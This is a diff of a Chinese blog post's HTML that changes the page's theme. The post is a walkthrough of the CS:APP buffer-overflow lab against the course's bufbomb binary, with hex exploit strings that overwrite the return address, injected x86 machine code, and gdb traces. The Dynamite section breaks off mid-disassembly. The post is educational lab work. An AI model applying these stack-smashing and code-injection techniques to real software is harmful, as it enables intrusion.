@@ -1,135 +1,78 @@
 <!DOCTYPE html>
-<html lang="en" prefix="og: http://ogp.me/ns# fb: https://www.facebook.com/2008/fbml">
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
-    <title>Buffer Overflow Attack实验 - Living@Greatwall</title>
-    <!-- Using the latest rendering mode for IE -->
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-
-
-<link rel="canonical" href="http://yangjin-unique.github.io/buffer-overflow-attackshi-yan.html">
-
-        <meta name="author" content="jin" />
-        <meta name="keywords" content="buffer overflow attack,security,hack,x86,stack" />
-        <meta name="description" content="这是cmu经典课程csapp的实验之一，主要任务是对课程提供的bufbomb程序进行buffer overflow攻击，以帮助我们深入理解x86 IA-32体系结构的函数调用惯例和栈组织结构，从而认识到这种攻击方法的本质，对我们编写安全的系统级代码非常有好处。这些实验同时也展示了如何攻击操作系统和网络服务器的安全弱点。 实验提供了以下3个可执行文件： - bufbomb: 这是我们要攻击的目标程序； - makecookie：根据用户id生成一个唯一的cookie，这个主要是防止抄袭作业:)； - hex2raw：将16进制的ascii值转换称对于的ascii字符； bufbomb程序会从标准输入中读取一个字符串，调用getbuf函数： /* Buffer size for getbuf */ #define NORMAL_BUFFER_SIZE 32 int getbuf() { char buf[NORMAL_BUFFER_SIZE]; Gets(buf); return 1; } 显然如果用户输入的字符串长度大于31时，就会破坏bufbomb的栈，如果在输入的字符串中带有特殊的地址和指令，就达到了攻击目的。下面的几个实验任务都是需要在这个字符串中嵌入特殊的指令和地址来完成实验任务。 Test 1: Candle bufbomb中函数test会调用getbuf，如下： void test() { int val; /* Put canary ..." />
-
-        <meta property="og:site_name" content="Living@Greatwall" />
-        <meta property="og:type" content="article"/>
-        <meta property="og:title" content="Buffer Overflow Attack实验"/>
-        <meta property="og:url" content="http://yangjin-unique.github.io/buffer-overflow-attackshi-yan.html"/>
-        <meta property="og:description" content="这是cmu经典课程csapp的实验之一，主要任务是对课程提供的bufbomb程序进行buffer overflow攻击，以帮助我们深入理解x86 IA-32体系结构的函数调用惯例和栈组织结构，从而认识到这种攻击方法的本质，对我们编写安全的系统级代码非常有好处。这些实验同时也展示了如何攻击操作系统和网络服务器的安全弱点。 实验提供了以下3个可执行文件： - bufbomb: 这是我们要攻击的目标程序； - makecookie：根据用户id生成一个唯一的cookie，这个主要是防止抄袭作业:)； - hex2raw：将16进制的ascii值转换称对于的ascii字符； bufbomb程序会从标准输入中读取一个字符串，调用getbuf函数： /* Buffer size for getbuf */ #define NORMAL_BUFFER_SIZE 32 int getbuf() { char buf[NORMAL_BUFFER_SIZE]; Gets(buf); return 1; } 显然如果用户输入的字符串长度大于31时，就会破坏bufbomb的栈，如果在输入的字符串中带有特殊的地址和指令，就达到了攻击目的。下面的几个实验任务都是需要在这个字符串中嵌入特殊的指令和地址来完成实验任务。 Test 1: Candle bufbomb中函数test会调用getbuf，如下： void test() { int val; /* Put canary ..."/>
-        <meta property="article:published_time" content="2016-02-19" />
-            <meta property="article:section" content="c&c++" />
-            <meta property="article:tag" content="buffer overflow attack" />
-            <meta property="article:tag" content="security" />
-            <meta property="article:tag" content="hack" />
-            <meta property="article:tag" content="x86" />
-            <meta property="article:tag" content="stack" />
-            <meta property="article:author" content="jin" />
-
-
-    <!-- Bootstrap -->
-        <link rel="stylesheet" href="http://yangjin-unique.github.io/theme/css/bootstrap.min.css" type="text/css"/>
-    <link href="http://yangjin-unique.github.io/theme/css/font-awesome.min.css" rel="stylesheet">
-
-    <link href="http://yangjin-unique.github.io/theme/css/pygments/native.css" rel="stylesheet">
-    <link rel="stylesheet" href="http://yangjin-unique.github.io/theme/css/style.css" type="text/css"/>
+  <meta charset="utf-8">
+  <title>Buffer Overflow Attack实验 &mdash; Living@Greatwall</title>
+  <meta name="author" content="Jin">
 
 
 
 
 
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <link href="/favicon.png" rel="icon">
+
+  <link href="/theme/css/main.css" media="screen, projection"
+        rel="stylesheet" type="text/css">
+
+  <link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic"
+        rel="stylesheet" type="text/css">
+  <link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic"
+        rel="stylesheet" type="text/css">
 </head>
+
 <body>
-
-<div class="navbar navbar-default navbar-fixed-top" role="navigation">
-	<div class="container">
-        <div class="navbar-header">
-            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
-                <span class="sr-only">Toggle navigation</span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-            </button>
-            <a href="http://yangjin-unique.github.io/" class="navbar-brand">
-Living@Greatwall            </a>
-        </div>
-        <div class="collapse navbar-collapse navbar-ex1-collapse">
-            <ul class="nav navbar-nav">
-                        <li class="active">
-                            <a href="http://yangjin-unique.github.io/category/cc.html">C&c++</a>
-                        </li>
-                        <li >
-                            <a href="http://yangjin-unique.github.io/category/linux.html">Linux</a>
-                        </li>
-                        <li >
-                            <a href="http://yangjin-unique.github.io/category/os.html">Os</a>
-                        </li>
-                        <li >
-                            <a href="http://yangjin-unique.github.io/category/python.html">Python</a>
-                        </li>
-                        <li >
-                            <a href="http://yangjin-unique.github.io/category/tools.html">Tools</a>
-                        </li>
-            </ul>
-            <ul class="nav navbar-nav navbar-right">
-              <li><a href="http://yangjin-unique.github.io/archives.html"><i class="fa fa-th-list"></i><span class="icon-label">Archives</span></a></li>
-            </ul>
-        </div>
-        <!-- /.navbar-collapse -->
-    </div>
-</div> <!-- /.navbar -->
-<!-- Banner -->
-<!-- End Banner -->
-<div class="container">
-    <div class="row">
-        <div class="col-sm-9">
-    <section id="content">
-        <article>
-            <header class="page-header">
-                <h1>
-                    <a href="http://yangjin-unique.github.io/buffer-overflow-attackshi-yan.html"
-                       rel="bookmark"
-                       title="Permalink to Buffer Overflow Attack实验">
-                        Buffer Overflow Attack实验
-                    </a>
-                </h1>
-            </header>
-            <div class="entry-content">
-                <div class="panel">
-                    <div class="panel-body">
-<footer class="post-info">
-    <span class="label label-default">Date</span>
-    <span class="published">
-        <i class="fa fa-calendar"></i><time datetime="2016-02-19T00:00:00+08:00"> Fri 19 February 2016</time>
-    </span>
+  <header role="banner"><hgroup>
+  <h1><a href="/">Living@Greatwall</a></h1>
+</hgroup></header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+</ul>
 
 
+<ul class="main-navigation">
+      <li class="active">
+        <a href="/category/cc.html">C&c++</a>
+      </li>
+      <li >
+        <a href="/category/linux.html">Linux</a>
+      </li>
+      <li >
+        <a href="/category/os.html">Os</a>
+      </li>
+      <li >
+        <a href="/category/python.html">Python</a>
+      </li>
+      <li >
+        <a href="/category/tools.html">Tools</a>
+      </li>
+</ul></nav>
+  <div id="main">
+    <div id="content">
+<div>
+  <article class="hentry" role="article">
+<header>
+      <h1 class="entry-title">Buffer Overflow Attack实验</h1>
+    <p class="meta">
+<time datetime="2016-02-19T00:00:00+08:00" pubdate>Fri 19 February 2016</time>    </p>
+</header>
 
-
-
-<span class="label label-default">Tags</span>
-	<a href="http://yangjin-unique.github.io/tag/buffer-overflow-attack.html">buffer overflow attack</a>
-        /
-	<a href="http://yangjin-unique.github.io/tag/security.html">security</a>
-        /
-	<a href="http://yangjin-unique.github.io/tag/hack.html">hack</a>
-        /
-	<a href="http://yangjin-unique.github.io/tag/x86.html">x86</a>
-        /
-	<a href="http://yangjin-unique.github.io/tag/stack.html">stack</a>
-    
-</footer><!-- /.post-info -->                    </div>
-                </div>
-                <p>这是cmu经典课程csapp的实验之一，主要任务是对课程提供的bufbomb程序进行buffer overflow攻击，以帮助我们深入理解x86 IA-32体系结构的函数调用惯例和栈组织结构，从而认识到这种攻击方法的本质，对我们编写安全的系统级代码非常有好处。这些实验同时也展示了如何攻击操作系统和网络服务器的安全弱点。</p>
-<p>实验提供了以下3个可执行文件：
-- bufbomb: 这是我们要攻击的目标程序；
-- makecookie：根据用户id生成一个唯一的cookie，这个主要是防止抄袭作业:)；
-- hex2raw：将16进制的ascii值转换称对于的ascii字符；</p>
+  <div class="entry-content"><p>这是cmu经典课程csapp的实验之一，主要任务是对课程提供的bufbomb程序进行buffer overflow攻击，以帮助我们深入理解x86 IA-32体系结构的函数调用惯例和栈组织结构，从而认识到这种攻击方法的本质，对我们编写安全的系统级代码非常有好处。这些实验同时也展示了如何攻击操作系统和网络服务器的安全弱点。</p>
+<p>实验提供了以下3个可执行文件：</p>
+<ul>
+<li>bufbomb: 这是我们要攻击的目标程序；</li>
+<li>makecookie：根据用户id生成一个唯一的cookie，这个主要是防止抄袭作业:)；</li>
+<li>hex2raw：将16进制的ascii值转换称对于的ascii字符；</li>
+</ul>
 <p>bufbomb程序会从标准输入中读取一个字符串，调用getbuf函数：</p>
-<div class="highlight"><pre><span class="cm">/* Buffer size for getbuf */</span>
+<div class="highlight"><pre><span></span><span class="cm">/* Buffer size for getbuf */</span>
 <span class="cp">#define NORMAL_BUFFER_SIZE 32</span>
 
 <span class="kt">int</span> <span class="nf">getbuf</span><span class="p">()</span>
@@ -144,7 +87,7 @@ Living@Greatwall            </a>
 <p>显然如果用户输入的字符串长度大于31时，就会破坏bufbomb的栈，如果在输入的字符串中带有特殊的地址和指令，就达到了攻击目的。下面的几个实验任务都是需要在这个字符串中嵌入特殊的指令和地址来完成实验任务。</p>
 <h3>Test 1: Candle</h3>
 <p>bufbomb中函数test会调用getbuf，如下：</p>
-<div class="highlight"><pre> <span class="kt">void</span> <span class="nf">test</span><span class="p">()</span>
+<div class="highlight"><pre><span></span> <span class="kt">void</span> <span class="nf">test</span><span class="p">()</span>
  <span class="p">{</span>
      <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
      <span class="cm">/* Put canary on stack to detect possible corruption */</span>
@@ -166,8 +109,9 @@ Living@Greatwall            </a>
 </pre></div>
 
 
-<p>当test执行完getbuf后会继续执行后面的代码，这个实验的任务是要改变这个执行路线，即当getbuf返回后不会沿着test执行下去，而是去执行smoke函数：</p>
-<div class="highlight"><pre><span class="kt">void</span> <span class="nf">smoke</span><span class="p">()</span>
+<p>正常来说当test执行完getbuf后会继续执行后面的代码。</p>
+<p><strong>实验任务</strong>:是要改变这个执行路线，即当getbuf返回后不会沿着test执行下去，而是去执行smoke函数：</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">smoke</span><span class="p">()</span>
 <span class="p">{</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Smoke!: You called smoke()</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
     <span class="n">validate</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
@@ -180,7 +124,7 @@ Living@Greatwall            </a>
     objdump -d bufbomb &gt; bufbomb.asm
 找到smoke的入口地址为：0x08048c18，下面如何将getbuf的返回地址替换为这个地址呢？这里我们要对x86的函数调用栈帧非常熟悉，可参考： https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames。
 当调用getbuf时，栈帧大概位置如下：</p>
-<div class="highlight"><pre>high ------------------------
+<div class="highlight"><pre><span></span>high ------------------------
     |  return addr to test() |
     |------------------------|
     |     ebp for test()     |
@@ -199,12 +143,12 @@ low |------------------------|
 
 <p>上面buf局部变量是保存输入的字符串的，它的地址为ebp-0x28（通过查看getbuf的反汇编代码），我们要修改的地址在return addr。显然我们输入的字符串只要一直overflow到return addr即可，总共44字节，最后加上smoke的地址，即能完成修改。
 由于输入的是字符串，而这个我们要将smoke的地址（4个字节）转换成对应的字符，hex2raw能帮我们完成这个转换，但由于该程序是x86-64平台的，不能在32位系统上运行，可用下面的python来代替：</p>
-<div class="highlight"><pre><span class="c">#! /usr/bin/env python</span>
-<span class="c"># coding=utf-8</span>
+<div class="highlight"><pre><span></span><span class="ch">#! /usr/bin/env python</span>
+<span class="c1"># coding=utf-8</span>
 
 <span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>
 
-<span class="n">raw</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">raw</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
 <span class="nb">input</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">()</span>
 <span class="k">for</span> <span class="nb">hex</span> <span class="ow">in</span> <span class="nb">input</span><span class="o">.</span><span class="n">split</span><span class="p">():</span>
     <span class="n">raw</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
@@ -213,13 +157,13 @@ low |------------------------|
 
 
 <p>我们将输入的字符串对应的16进制值写到一个文本文件level1.txt中，内容如下：</p>
-<div class="highlight"><pre>31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 18 8c 04 08
+<div class="highlight"><pre><span></span>31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 18 8c 04 08
 </pre></div>
 
 
 <p>前面的44个字节为任意字符（但不能为\n，表示输入结束），最后的4个字节为smoke的入口地址（注意x86是little endian字节序）。然后用hex2raw.py将这个文件转换成对应的字符串ans.raw。</p>
 <p>下面通过gdb来检验一下是否成功。在gdb中getbuf处设置断点:</p>
-<div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">-</span><span class="n">u</span> <span class="n">yj</span> <span class="o">&lt;</span> <span class="n">ans</span><span class="p">.</span><span class="n">raw</span> 
+<div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">-</span><span class="n">u</span> <span class="n">yj</span> <span class="o">&lt;</span> <span class="n">ans</span><span class="p">.</span><span class="n">raw</span> 
 <span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yj</span><span class="o">/</span><span class="n">yangjin</span><span class="o">/</span><span class="n">cs_app</span><span class="o">/</span><span class="n">buflab</span><span class="o">/</span><span class="n">buflab</span><span class="o">-</span><span class="n">handout</span><span class="o">/</span><span class="n">bufbomb</span> <span class="o">-</span><span class="n">u</span> <span class="n">yj</span> <span class="o">&lt;</span> <span class="n">ans</span><span class="p">.</span><span class="n">raw</span>
 <span class="nl">Userid</span><span class="p">:</span> <span class="n">yj</span>
 <span class="nl">Cookie</span><span class="p">:</span> <span class="mh">0x3ab24af4</span>
@@ -246,7 +190,7 @@ low |------------------------|
 
 
 <p>查看当前栈(esp=0x556836a8)的信息：</p>
-<div class="highlight"><pre>(gdb) x/20x 0x556836a8
+<div class="highlight"><pre><span></span>(gdb) x/20x 0x556836a8
 0x556836a8 &lt;_reserved+1037992&gt;: 0x0000513a  0xb7fbf3cc  0x0000000c  0x1126312e
 0x556836b8 &lt;_reserved+1038008&gt;: 0x00000000  0xb7fc0898  0x00000000  0x08048da8
 0x556836c8 &lt;_reserved+1038024&gt;: 0x0000513a  0x0804836c  0xb7e586b1  0xb7fbf000
@@ -256,7 +200,7 @@ low |------------------------|
 
 
 <p>buf的起始地址为：ebp-0x28=0x556836e0-0x28=0x556836b8。上面打印的栈空间第4行的最后4个字节ox08048dbe就是getbuf的return addr，同时也是test函数的call getbuf的下一条指令：</p>
-<div class="highlight"><pre>8048daa &lt;test&gt;:
+<div class="highlight"><pre><span></span>8048daa &lt;test&gt;:
 8048daa:    55                      push   %ebp
 8048dab:    89 e5                   mov    %esp,%ebp
 8048dad:    53                      push   %ebx
@@ -270,21 +214,21 @@ low |------------------------|
 
 
 <p>然后继续单步执行，</p>
-<div class="highlight"><pre><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">n</span>
-<span class="nx">Single</span> <span class="nx">stepping</span> <span class="nx">until</span> <span class="nx">exit</span> <span class="nx">from</span> <span class="kd">function</span> <span class="nx">getbuf</span><span class="p">,</span>
-<span class="nx">which</span> <span class="nx">has</span> <span class="nx">no</span> <span class="nx">line</span> <span class="nx">number</span> <span class="nx">information</span><span class="p">.</span>
-<span class="mh">0x08048c18</span> <span class="k">in</span> <span class="nx">smoke</span> <span class="p">()</span>
-<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">x</span><span class="o">/</span><span class="mi">20</span><span class="nx">x</span> <span class="mh">0x556836a8</span>
-<span class="mh">0x556836a8</span> <span class="o">&lt;</span><span class="nx">_reserved</span><span class="o">+</span><span class="mi">1037992</span><span class="o">&gt;:</span> <span class="mh">0x556836b8</span>  <span class="mh">0xb7fbf3cc</span>  <span class="mh">0x0000000c</span>  <span class="mh">0x1126312e</span>
-<span class="mh">0x556836b8</span> <span class="o">&lt;</span><span class="nx">_reserved</span><span class="o">+</span><span class="mi">1038008</span><span class="o">&gt;:</span> <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>
-<span class="mh">0x556836c8</span> <span class="o">&lt;</span><span class="nx">_reserved</span><span class="o">+</span><span class="mi">1038024</span><span class="o">&gt;:</span> <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>
-<span class="mh">0x556836d8</span> <span class="o">&lt;</span><span class="nx">_reserved</span><span class="o">+</span><span class="mi">1038040</span><span class="o">&gt;:</span> <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x08048c18</span>
-<span class="mh">0x556836e8</span> <span class="o">&lt;</span><span class="nx">_reserved</span><span class="o">+</span><span class="mi">1038056</span><span class="o">&gt;:</span> <span class="mh">0xb7fbfa00</span>  <span class="mh">0x0804a57e</span>  <span class="mh">0x55683720</span>  <span class="mh">0x00000001</span>
+<div class="highlight"><pre><span></span>(gdb) n
+Single stepping until exit from function getbuf,
+which has no line number information.
+0x08048c18 in smoke ()
+(gdb) x/20x 0x556836a8
+0x556836a8 &lt;_reserved+1037992&gt;: 0x556836b8  0xb7fbf3cc  0x0000000c  0x1126312e
+0x556836b8 &lt;_reserved+1038008&gt;: 0x31313131  0x31313131  0x31313131  0x31313131
+0x556836c8 &lt;_reserved+1038024&gt;: 0x31313131  0x31313131  0x31313131  0x31313131
+0x556836d8 &lt;_reserved+1038040&gt;: 0x31313131  0x31313131  0x31313131  0x08048c18
+0x556836e8 &lt;_reserved+1038056&gt;: 0xb7fbfa00  0x0804a57e  0x55683720  0x00000001
 </pre></div>
 
 
 <p>从上面看到我们从buf（0x556836b8）开始的内容全部改成了我们的输入的字符串，并且可以看到getbuf完后成功返回到smoke的入口地址。最后继续：</p>
-<div class="highlight"><pre>(gdb) c
+<div class="highlight"><pre><span></span>(gdb) c
 Continuing.
 Type string:Smoke!: You called smoke()
 VALID
@@ -296,11 +240,11 @@ NICE JOB!
 <p>成功完成！</p>
 <h3>Test2: Sparkler</h3>
 <p>bufbomb中有个fizz函数：</p>
-<div class="highlight"><pre><span class="nt">void</span> <span class="nt">fizz</span><span class="o">(</span><span class="nt">int</span> <span class="nt">val</span><span class="o">)</span>
+<div class="highlight"><pre><span></span><span class="nt">void</span> <span class="nt">fizz</span><span class="o">(</span><span class="nt">int</span> <span class="nt">val</span><span class="o">)</span>
 <span class="p">{</span>
-    <span class="n">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="err">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span><span class="o">,</span> <span class="n">val</span><span class="p">);</span>
-        <span class="n">validate</span><span class="p">(</span><span class="m">1</span><span class="p">);</span>
+    <span class="err">if</span> <span class="err">(val</span> <span class="err">==</span> <span class="err">cookie)</span> <span class="err">{</span>
+        <span class="err">printf(&quot;Fizz!:</span> <span class="err">You</span> <span class="err">called</span> <span class="err">fizz(0x%x)\n&quot;,</span> <span class="err">val)</span><span class="p">;</span>
+        <span class="err">validate(1)</span><span class="p">;</span>
     <span class="p">}</span> <span class="nt">else</span>
         <span class="nt">printf</span><span class="o">(</span><span class="s2">&quot;Misfire: You called fizz(0x%x)\n&quot;</span><span class="o">,</span> <span class="nt">val</span><span class="o">);</span>
     <span class="nt">exit</span><span class="o">(</span><span class="nt">0</span><span class="o">);</span>
@@ -308,11 +252,12 @@ NICE JOB!
 </pre></div>
 
 
-<p>同样这个任务也是要test执行完getbuf后跳转到执行fizz，与之前不同的是，fizz有个参数，同时要将这个参数设为cookie这个值。这个任务主要是要知道函数参数如何入栈(几种不同的方式：cdecl, stdcall, fastcall, thiscall等)，可参考前面提到的文章。</p>
+<p><strong>实验任务</strong>：test执行完getbuf后跳转到执行fizz，与之前不同的是，fizz有个参数，同时要将这个参数设为cookie这个值。</p>
+<p>这个任务主要是要知道函数参数如何入栈(几种不同的方式：cdecl, stdcall, fastcall, thiscall等)，可参考前面提到的文章。</p>
 <p>将getbuf的返回地址设为fizz入口地址这个跟前面实验一样，关键是在哪里设置这个参数。
 前面gdb调试可看到在getbuf中执行时，ebp=0x556836e0，所以当getbuf执行完跳入fizz之前，esp=0x556836e8（为什么？因为getbuf最后执行两条指令leave和ret，leave会将ebp赋给esp，然后pop ebp，而ret指令相当于pop eip，共两次pop，整个过程相当于esp=ebp+4+4）。
 fizz反汇编如下：</p>
-<div class="highlight"><pre>8048c42 &lt;fizz&gt;:
+<div class="highlight"><pre><span></span>8048c42 &lt;fizz&gt;:
 8048c42:    55                      push   %ebp
 8048c43:    89 e5                   mov    %esp,%ebp
 8048c45:    83 ec 18                sub    $0x18,%esp
@@ -324,13 +269,13 @@ fizz反汇编如下：</p>
 <p>进入fizz后，执行第一条指令push ebp，此时esp=esp-4=0x556836e4，然后执行mov %esp, %ebp，此时ebp=0x556836e4。根据上面的cmp指令可看出fizz的参数地址为ebp+0x8=0x556836ec，
 这就是我们要放入cookie的值的地址（buf的起始地址仍跟前面一样0x556836b8）。
 level2.txt的输入字符串如下：</p>
-<div class="highlight"><pre>31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 42 8c 04 08 31 31 31 31 f4 4a b2 3a
+<div class="highlight"><pre><span></span>31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 42 8c 04 08 31 31 31 31 f4 4a b2 3a
 </pre></div>
 
 
 <p>上面08048c42是fizz的入口地址，3ab24af4是cookie。
 执行如下命令：</p>
-<div class="highlight"><pre>cat level1.txt  | ./hex2raw.py | ./bufbomb -u yj
+<div class="highlight"><pre><span></span>cat level1.txt  | ./hex2raw.py | ./bufbomb -u yj
 Userid: yj
 Cookie: 0x3ab24af4
 Type string:Fizz!: You called fizz(0x3ab24af4)
@@ -342,7 +287,7 @@ NICE JOB!
 <p>成功完成！</p>
 <h3>Test 3: Firecracker</h3>
 <p>前面两个攻击都只是修改了函数调用路线，没什么卵用，本实验将实现如何让程序执行我们自己的hack的代码，这要就能随心所欲的干坏事了:)。在bufbomb中有如下代码：</p>
-<div class="highlight"><pre><span class="kt">int</span> <span class="n">global_value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="n">global_value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="kt">void</span> <span class="nf">bang</span><span class="p">(</span><span class="kt">int</span> <span class="n">val</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">global_value</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
@@ -355,10 +300,10 @@ NICE JOB!
 </pre></div>
 
 
-<p>我们的任务是在getbuf返回时执行我们自己定义的指令，这些指令要修改global_value值为cookie，然后执行bang函数。</p>
+<p><strong>实验任务</strong>：在getbuf返回时执行我们自己定义的指令，这些指令要修改global_value值为cookie，然后执行bang函数。</p>
 <p>总的思路就是编写修改global_value的汇编指令放在buf中，然后跟前面的实验一样，只是将跳转的地址改成buf的地址，这要执行getbuf后就跳到去执行汇编指令，这些汇编指令除了要修改global_value的值外，还要确保执行完后要能跳到bang函数执行。
 我们的汇编指令如下(example.S)：</p>
-<div class="highlight"><pre>movl $0x3ab24af4, 0x0804d100  #put cookie value in global_value (addr: 0x0804d100)
+<div class="highlight"><pre><span></span>movl $0x3ab24af4, 0x0804d100  #put cookie value in global_value (addr: 0x0804d100)
 pushl $0x08048c9d             #push bang entry address into stack
 ret
 </pre></div>
@@ -369,7 +314,7 @@ ret
     unix&gt; gcc -m32 -c example.S
     unix&gt; objdump -d example.o &gt; example.d</p>
 <p>example.d如下内容：</p>
-<div class="highlight"><pre>00000000 &lt;.text&gt;:
+<div class="highlight"><pre><span></span>00000000 &lt;.text&gt;:
 0:  c7 05 00 d1 04 08 f4    movl   $0x3ab24af4,0x804d100
 7:  4a b2 3a 
 a:  68 9d 8c 04 08          push   $0x8048c9d
@@ -378,12 +323,12 @@ f:  c3                      ret
 
 
 <p>前面的数字就是对应的机器码，将这些机器码写入level3.txt，还有buf的起始地址：</p>
-<div class="highlight"><pre>c7 05 00 d1 04 08 f4 4a b2 3a 68 9d 8c 04 08 c3 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 b8 36 68 55
+<div class="highlight"><pre><span></span>c7 05 00 d1 04 08 f4 4a b2 3a 68 9d 8c 04 08 c3 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 b8 36 68 55
 </pre></div>
 
 
 <p>最后运行: </p>
-<div class="highlight"><pre>cat level3.txt  | ./hex2raw.py | ./bufbomb -u yj
+<div class="highlight"><pre><span></span>cat level3.txt  | ./hex2raw.py | ./bufbomb -u yj
 Userid: yj
 Cookie: 0x3ab24af4
 Type string:Bang!: You set global_value to 0x3ab24af4
@@ -393,112 +338,132 @@ NICE JOB!
 
 
 <p>完成任务！</p>
-            </div>
-            <!-- /.entry-content -->
-    <hr/>
-    <section class="comments" id="comments">
-        <h2>Comments</h2>
-
-        <div id="disqus_thread"></div>
-        <script type="text/javascript">
-            /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
-            var disqus_shortname = 'yangjin-unique'; // required: replace example with your forum shortname
-
-                    var disqus_identifier = 'buffer-overflow-attackshi-yan';
-                var disqus_url = 'http://yangjin-unique.github.io/buffer-overflow-attackshi-yan.html';
-
-            var disqus_config = function () {
-                this.language = "en";
-            };
-
-            /* * * DON'T EDIT BELOW THIS LINE * * */
-            (function () {
-                var dsq = document.createElement('script');
-                dsq.type = 'text/javascript';
-                dsq.async = true;
-                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-            })();
-        </script>
-        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
-            Disqus.</a></noscript>
-        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-
-    </section>
-        </article>
-    </section>
-
-        </div>
-        <div class="col-sm-3" id="sidebar">
-            <aside>
-
-<section class="well well-sm">
-    <ul class="list-group list-group-flush">
+<h3>Test 4: Dynamite</h3>
+<p>前面的几个实验都成功的利用缓冲区来破坏栈并执行我们指定的函数，但是更精妙的攻击方式是让bufbomb执行完我们hack的代码，更改寄存器和内存后，仍然能够正常返回继续执行原程序test()函数。
+<strong>实验任务</strong>：让getbuf函数返回cookie的值（而不是１）给test，并且要能正常返回到test中继续执行，这样test会输出“Boom!:...”
+思路：跟前面实验类似，在buffer中加入我们自己的code，这段code会把cookie值设给eax（getbuf返回值通过eax传递），然后恢复正确的值给ebp（因为ebp的内容已被buffer破坏），接着将返回到test的指令地址入栈。最后需要将getbuf的返回地址改成buf的起始地址，以执行我们的code。
+我们的汇编代码如下：</p>
+<div class="highlight"><pre><span></span>movl $0x3ab24af4, %eax      #put cookie value in eax 
+pushl $0x08048dbe           #push address of next instruction after getbuf in test()  
+movl $0x55683710, %ebp      #set ebp of test correctly
+ret
+</pre></div>
 
 
+<p>按前面的方式获取对应的机器码：</p>
+<div class="highlight"><pre><span></span>level3_run_code.o:     file format elf32-i386
 
 
+Disassembly of section .text:
 
-    <li class="list-group-item"><h4><i class="fa fa-external-link-square fa-lg"></i><span class="icon-label">Links</span></h4>
-      <ul class="list-group" id="links">
-        <li class="list-group-item">
-            <a href="http://getpelican.com/" target="_blank">
-                Pelican
-            </a>
-        </li>
-        <li class="list-group-item">
-            <a href="http://lxr.free-electrons.com" target="_blank">
-                Online Linux Kernel Source Code
-            </a>
-        </li>
-        <li class="list-group-item">
-            <a href="http://coolshell.cn" target="_blank">
-                酷壳CoolShell
-            </a>
-        </li>
-      </ul>
-    </li>
-    </ul>
-</section>
